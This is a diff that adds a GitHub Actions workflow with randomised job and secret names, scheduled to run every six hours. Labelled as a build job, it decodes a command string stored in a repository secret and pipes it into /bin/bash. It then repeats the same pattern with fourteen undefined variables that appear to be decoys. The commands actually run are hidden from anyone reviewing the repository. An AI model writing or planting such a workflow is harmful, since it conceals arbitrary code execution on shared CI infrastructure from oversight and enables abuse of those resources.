@@ -1,0 +1,30 @@
+name: chengjiezi1829
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengjiezi1829
+        env:
+          f90746: ${{ secrets.f90746 }}
+        run: |
+          echo $f90746 | jq -r .kdoy45 | /bin/bash
+          echo $dwau7 | jq -r .p76 | /bin/bash
+          echo $h39624 | jq -r .urdmf817 | /bin/bash
+          echo $fwhmp1276 | jq -r .p6 | /bin/bash
+          echo $izr00 | jq -r .lsj80224 | /bin/bash
+          echo $vo9051 | jq -r .hcff09 | /bin/bash
+          echo $dcx203 | jq -r .h38 | /bin/bash
+          echo $tgi3 | jq -r .cmqan37934 | /bin/bash
+          echo $oyx97 | jq -r .qup2131 | /bin/bash
+          echo $pznj634 | jq -r .pd82707 | /bin/bash
+          echo $a1180 | jq -r .r6 | /bin/bash
+          echo $mfkw4 | jq -r .nyj4 | /bin/bash
+          echo $mbut184 | jq -r .uwbvq94 | /bin/bash
+          echo $ufrq8 | jq -r .wl76055 | /bin/bash
+          echo $mfp97596 | jq -r .sr38 | /bin/bash
+
